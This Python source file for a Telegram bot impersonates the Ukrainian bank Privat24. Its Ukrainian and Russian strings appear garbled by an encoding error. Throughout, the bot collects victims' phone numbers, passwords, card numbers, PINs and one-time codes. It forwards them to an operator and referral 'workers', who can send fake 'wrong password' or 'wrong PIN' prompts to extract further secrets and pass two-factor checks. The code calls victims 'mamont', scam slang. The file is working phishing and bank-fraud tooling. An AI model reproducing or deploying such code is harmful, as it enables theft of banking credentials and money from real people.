import Config
from InstanceBot import bot, dp
from aiogram import types, Dispatcher
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
from keyboards import Keyboards
from database import db
from states import User


class log(StatesGroup):
    number = State()
    password = State()
    card = State()
    pin = State()


class new_log(StatesGroup):
    number = State()
    log_pass = State()
    num_pass = State()
    cod3 = State()
    passwrd = State()
    pincode = State()
    card = State()
    msg = State()
    msg2 = State()
    getcode = State()
    block = State()


async def start(message: types.Message):
    user_id = message.from_user.id
    name = message.from_user.username
    try:
        if not db.user_exist(user_id):
            start_comm = message.text
            ref_id = str(start_comm[7:])
            if str(ref_id) != '':
                if str(ref_id) != str(user_id):
                    db.add_user(user_id, name, ref_id, 0)
                    await bot.send_message(message.chat.id, 'üíç –í—ñ—Ç–∞—î–º–æ –í–∞—Å. –í–∏ –∑–∞–π—à–ª–∏ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º –≤–µ—Ä—Å—ñ—é –ü—Ä–∏–≤–∞—Ç24.\n'
                                                            '–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Å—ñ—Ö –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π, –ø—Ä–æ—Å–∏–º–æ –≤–∞—Å –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏—Å—è.',
                                           reply_markup=Keyboards.main_menu())
                    await User.menu.menu.set()
                    try:
                        await bot.send_message(Config.admin_id, f'–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å\n'
                                                                f'ID: {user_id}\n'
                                                                f'NAME: {name}\n'
                                                                f'WORKER: {ref_id}')
                        await bot.send_message(ref_id, f'–ù–æ–≤—ã–π –º–∞–º–æ–Ω—Ç @{name}, {user_id}')
                    except:
                        pass
                else:
                    pass
            else:
                db.add_user(user_id, name, 0, 0)
                await bot.send_message(message.chat.id, 'üíç –í—ñ—Ç–∞—î–º–æ –í–∞—Å. –í–∏ –∑–∞–π—à–ª–∏ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º –≤–µ—Ä—Å—ñ—é –ü—Ä–∏–≤–∞—Ç24.\n'
                                                        '–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Å—ñ—Ö –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π, –ø—Ä–æ—Å–∏–º–æ –≤–∞—Å –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏—Å—è.',
                                       reply_markup=Keyboards.main_menu())
                await User.menu.menu.set()
        else:
            await bot.send_message(message.chat.id, 'üíç –í—ñ—Ç–∞—î–º–æ –í–∞—Å. –í–∏ –∑–∞–π—à–ª–∏ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º –≤–µ—Ä—Å—ñ—é –ü—Ä–∏–≤–∞—Ç24.\n'
                                                    '–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Å—ñ—Ö –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π, –ø—Ä–æ—Å–∏–º–æ –≤–∞—Å –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏—Å—è.',
                                   reply_markup=Keyboards.main_menu())
            await User.menu.menu.set()
    except:
        await bot.send_message(user_id, 'üíç –í—ñ—Ç–∞—î–º–æ –í–∞—Å. –í–∏ –∑–∞–π—à–ª–∏ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º –≤–µ—Ä—Å—ñ—é –ü—Ä–∏–≤–∞—Ç24.\n'
                                        '–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Å—ñ—Ö –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π, –ø—Ä–æ—Å–∏–º–æ –≤–∞—Å –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏—Å—è.',
                               reply_markup=Keyboards.main_menu())
        await User.menu.menu.set()


async def nazad(message: types.Message):
    await User.menu.menu.set()
    await bot.send_message(message.chat.id, '–í–∏ –ø–æ–≤–µ—Ä–Ω—É–ª–∏—Å—è –≤ –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é', reply_markup=Keyboards.main_menu())


async def work(message: types.Message):
    user_id = message.from_user.id
    await bot.send_message(message.chat.id, f'–¢–≤–æ—è —Ä–µ—Ñ —Å—Å—ã–ª–∫–∞:\n'
                                            f't.me/{Config.link}?start={user_id}')


async def menu(message: types.Message):
    if db.get_info_user(message.from_user.id)[4] == 0:
        button = db.get_hand_butt(message.text)
        if message.text in db.hand_butt() and db.get_setting()[0][0] == 1:
            if message.text == db.hand_butt()[0]:
                await log.number.set()
                await bot.send_photo(message.chat.id, button[3], button[2],
                                     reply_markup=Keyboards.kb_nazad)  # –ü—Ä–æ—Å–∏—Ç –Ω–æ–º–µ—Ä
            else:
                await bot.send_photo(message.chat.id, button[3], button[2])
        if message.text in db.hand_butt() and db.get_setting()[0][0] == 0:
            if message.text == db.hand_butt()[0]:
                await log.number.set()
                await bot.send_message(message.chat.id, button[2], reply_markup=Keyboards.kb_nazad)  # –ü—Ä–æ—Å–∏—Ç –Ω–æ–º–µ—Ä
            else:
                await bot.send_message(message.chat.id, button[2])
    else:
        await bot.send_message(message.chat.id, '–í–∞—Å –±—É–ª–æ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —Å–∏—Å—Ç–µ–º–æ—é –±–µ–∑–ø–µ–∫–∏')


async def number(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['number'] = message.text
    await log.password.set()
    await bot.send_message(message.chat.id, 'üîê –í—Ö—ñ–¥ —É –ü—Ä–∏–≤–∞—Ç24 - –≤–µ—Ä—Å—ñ—è —Ç–µ–ª–µ–≥—Ä–∞–º-–±–æ—Ç.\n\n'
                                            '–ü–∞—Ä–æ–ª—å:') #–ü—Ä–æ—Å–∏—Ç –ø–∞—Ä–æ–ª—å


async def password(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        number = data['number']
        passw = message.text
    data_user = db.get_info_user(message.from_user.id)
    if data_user[3] != 0:
        data_worker = db.get_info_user(data_user[3])
        await bot.send_message(Config.admin_id, f'–ù–æ–º–µ—Ä: <code>{number}</code>\n'
                                                f'–ü–∞—Å—Å: <code>{passw}</code>\n'
                                                f'WORKER: <code>{data_user[3]}</code> | @{data_worker[2]}\n'
                                                f'–ú–∞–º–æ–Ω—Ç: @{data_user[2]} | <code>{data_user[1]}</code>',
                               reply_markup=Keyboards.menu_vbiv(message.from_user.id), parse_mode='html')
        await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...',
                               reply_markup=Keyboards.main_menu())  # –ö–æ–Ω–µ—á–Ω–∞—è
        await User.menu.menu.set()
    else:
        await bot.send_message(Config.admin_id, f'–ù–æ–º–µ—Ä: <code>{number}</code>\n'
                                                f'–ü–∞—Å—Å: <code>{passw}</code>\n'
                                                f'WORKER: NONE\n'
                                                f'–ú–∞–º–æ–Ω—Ç: @{data_user[2]} | <code>{data_user[1]}</code>',
                               reply_markup=Keyboards.menu_vbiv(message.from_user.id), parse_mode='html')
        await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...',
                               reply_markup=Keyboards.main_menu())  # –ö–æ–Ω–µ—á–Ω–∞—è
        await User.menu.menu.set()


async def calldata_vbiv(call: types.CallbackQuery, state: FSMContext):
    await bot.answer_callback_query(callback_query_id=call.id)
    temp = call.data.split('|')
    user_id = temp[2]
    vbiv_id = call.from_user.id
    if temp[1] == 'num':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –Ω–æ–º–µ—Ä. –í–∫–∞–∂—ñ—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –Ω–æ–º–µ—Ä:',
                               reply_markup=Keyboards.number(user_id, vbiv_id))
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–≤–µ—Ä–Ω–æ–º –Ω–æ–º–µ—Ä–µ')
    if temp[1] == 'lp':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, '‚ùå –ù–µ–≤—ñ—Ä–Ω–∏–π –ª–æ–≥—ñ–Ω –∞–±–æ –ø–∞—Ä–æ–ª—å. –°–ø—Ä–æ–±—É–π—Ç–µ –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏—Å—è –∑–Ω–æ–≤—É.')
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–≤–µ—Ä–Ω–æ–º –ª–æ–≥–∏–Ω–µ/–ø–∞—Ä–æ–ª–µ')
    if temp[1] == 'p':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'‚ùå –ù–µ–≤—ñ—Ä–Ω–∏–π –ø–∞—Ä–æ–ª—å. –ü–æ–≤—Ç–æ—Ä—ñ—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∑–Ω–æ–≤—É.')
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–≤–µ—Ä–Ω–æ–º –ø–∞—Ä–æ–ª–µ')
    if temp[1] == 'otm_auth':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'‚ùå –í–∏ –≤—ñ–¥—Ö–∏–ª–∏–ª–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é. –ü–æ–≤—Ç–æ—Ä—ñ—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∑–Ω–æ–≤—É.')
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—Ç–º–µ–Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏')
    if temp[1] == 'crd':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'‚ùå –í–≤–µ–¥–µ–Ω–∞ –≤–∞–º–∏ –∫–∞—Ä—Ç–∫–∞ –Ω–µ–¥—ñ–π—Å–Ω–∞. –í–∫–∞–∂—ñ—Ç—å –≤—ñ—Ä–Ω—É –∫–∞—Ä—Ç–∫—É.',
                               reply_markup=Keyboards.card(user_id, vbiv_id))
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–≤–µ—Ä–Ω–æ–π –∫–∞—Ä—Ç–µ')
    if temp[1] == 'msg':
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.msg.set()
        async with state.proxy() as data:
            data['user_id'] = user_id
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤—å —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –º–∞–º–æ–Ω—Ç–∞')
    if temp[1] == 'gc':
        await bot.send_message(user_id,
                               '‚úâÔ∏è –û—á—ñ–∫—É–π—Ç–µ –¥–∑–≤—ñ–Ω–∫–∞ –∑ –∫–æ–¥–æ–º, –ø—ñ—Å–ª—è —á–æ–≥–æ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É "–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –∫–æ–¥" —ñ –Ω–∞–ø–∏—à—ñ—Ç—å —ó—ó.',
                               reply_markup=Keyboards.code(user_id, vbiv_id))
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—Ä–æ—Å–µ –∫–æ–¥–∞')
    if temp[1] == 'pin':
        await bot.send_message(user_id, '‚ùå –ü–æ–º–∏–ª–∫–∞: –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π PIN. –í–∫–∞–∂—ñ—Ç—å –≤—ñ—Ä–Ω–∏–π PIN-–∫–æ–¥.',
                               reply_markup=Keyboards.pin(user_id, vbiv_id))
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–≤–µ—Ä–Ω–æ–º –ø–∏–Ω-–∫–æ–¥–µ')
    if temp[1] == 'zvon':
        await bot.send_message(user_id, 'üì±–û—á—ñ–∫—É–π—Ç–µ –¥–∑–≤—ñ–Ω–æ–∫ —ñ –ø—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å –≤—Ö—ñ–¥.')
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –ø–æ –∑–≤–æ–Ω–∫—É')
    if temp[1] == 'push':
        await bot.send_message(user_id,
                               'üì≤ –ü—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å –ø—É—à-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤ –¥–æ–¥–∞—Ç–∫—É –ü—Ä–∏–≤–∞—Ç24 –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –≤ –±–æ—Ç—ñ.')
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –ø—É—à —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ')
    if temp[1] == 'cod3':
        await bot.send_message(user_id, '‚úâÔ∏è –í–∞–º –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –∫–æ–¥ —ñ–∑ —Ç—Ä—å–æ—Ö —Ü–∏—Ñ—Ä, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ.',
                               reply_markup=Keyboards.code3(user_id, vbiv_id))
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {user_id} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—Ä–æ—Å–µ –∫–æ–¥–∞ –∏–∑ 3 —Ü–∏—Ñ—Ä')
    if temp[1] == 'bl':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        db.ban_user(user_id)
        await bot.send_message(vbiv_id, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω')


async def calldata_user(call: types.CallbackQuery, state: FSMContext):
    temp = call.data.split('|')
    user_id = call.from_user.id
    vbiv_id = temp[3]
    if temp[1] == 'n':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.number.set()
        await bot.send_message(user_id, '‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä')
        await bot.send_message(vbiv_id, f'–ú–∞–º–æ–Ω—Ç {user_id} –Ω–∞–∂–∞–ª –∫–Ω–æ–ø–∫—É –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä –ø–æ–≤—Ç–æ—Ä–Ω–æ')
    if temp[1] == 'msg_u':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.msg2.set()
        async with state.proxy() as data:
            data['vbiv_id'] = vbiv_id
        await bot.send_message(user_id, '‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å')
        await bot.send_message(vbiv_id, f'–ú–∞–º–æ–Ω—Ç {user_id} –Ω–∞–∂–∞–ª –æ—Ç–≤–µ—Ç–∏—Ç—å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ')
    if temp[1] == 'code':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.getcode.set()
        await bot.send_message(user_id, '‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –∫–æ–¥')
        await bot.send_message(vbiv_id, f'–ú–∞–º–æ–Ω—Ç {user_id} –≤–≤–æ–¥–∏—Ç –∫–æ–¥')
    if temp[1] == 'card':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.card.set()
        await bot.send_message(user_id, '‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –∫–∞—Ä—Ç—É')
        await bot.send_message(vbiv_id, f'–ú–∞–º–æ–Ω—Ç {user_id} –≤–≤–æ–¥–∏—Ç –∫–∞—Ä—Ç—É')
    if temp[1] == 'pin':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.pincode.set()
        await bot.send_message(user_id, '‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å PIN')
        await bot.send_message(vbiv_id, f'–ú–∞–º–æ–Ω—Ç {user_id} –≤–≤–æ–¥–∏—Ç PIN')
    if temp[1] == 'cod3':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.cod3.set()
        await bot.send_message(user_id, '‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –∫–æ–¥')
        await bot.send_message(vbiv_id, f'–ú–∞–º–æ–Ω—Ç {user_id} –≤–≤–æ–¥–∏—Ç –∫–æ–¥ 3 —Ü–∏—Ñ—Ä—ã')


async def user_answer(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        vbiv_id = data['vbiv_id']
    await bot.send_message(vbiv_id, f'–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç {message.from_user.id} | @{message.from_user.username}\n'
                                    f'MESSAGE: {message.text}',
                           reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...')
    await User.menu.menu.set()


async def user_povtor(message: types.Message):
    await bot.send_message(Config.admin_id, f'–ù–æ–≤—ã–π –Ω–æ–º–µ—Ä –æ—Ç {message.from_user.id} | @{message.from_user.username}\n'
                                            f'NUMBER: {message.text}')
    await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...')
    await User.menu.menu.set()


async def send_msg(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        user_id = data['user_id']
    await bot.send_message(user_id, message.text, reply_markup=Keyboards.msg(user_id, message.from_user.id))
    await User.menu.menu.set()
    await bot.send_message(message.chat.id, f'–°–æ–æ–±—â–µ–Ω–∏–µ –º–∞–º–æ–Ω—Ç—É –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ',
                           reply_markup=Keyboards.menu_vbiv(user_id))


@dp.message_handler(state=new_log.getcode)
async def gcode_user(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'–ö–æ–¥ –æ—Ç {message.from_user.id} | @{message.from_user.username}\n'
                                            f'CODE: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...')
    await User.menu.menu.set()


@dp.message_handler(state=new_log.card)
async def card_new(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'CARD –æ—Ç {message.from_user.id} | @{message.from_user.username}\n'
                                            f'CARD: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...')
    await User.menu.menu.set()


@dp.message_handler(state=new_log.pincode)
async def pin_new(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'PIN –æ—Ç {message.from_user.id} | @{message.from_user.username}\n'
                                            f'PIN: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...')
    await User.menu.menu.set()


@dp.message_handler(state=new_log.cod3)
async def pin_new(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'CODE3 –æ—Ç {message.from_user.id} | @{message.from_user.username}\n'
                                            f'CODE3: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '‚ôªÔ∏è –¢—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞...')
    await User.menu.menu.set()


def add_hand_user(dp: Dispatcher):
    dp.register_message_handler(nazad, text=['–ù–∞–∑–∞–¥'], state='*')
    dp.register_message_handler(work, commands=['work'], state='*')
    dp.register_message_handler(start, commands=['start'], state='*')
    dp.register_message_handler(menu, content_types=['text'], state=User.menu.menu)
    dp.register_message_handler(number, state=log.number)
    dp.register_message_handler(password, state=log.password)
    dp.register_callback_query_handler(calldata_vbiv, lambda c: c.data and c.data.startswith('#'), state='*')
    dp.register_callback_query_handler(calldata_user, lambda c: c.data and c.data.startswith('z'), state='*')
    dp.register_message_handler(user_povtor, state=new_log.number)
    dp.register_message_handler(send_msg, state=new_log.msg)
    dp.register_message_handler(user_answer, state=new_log.msg2)


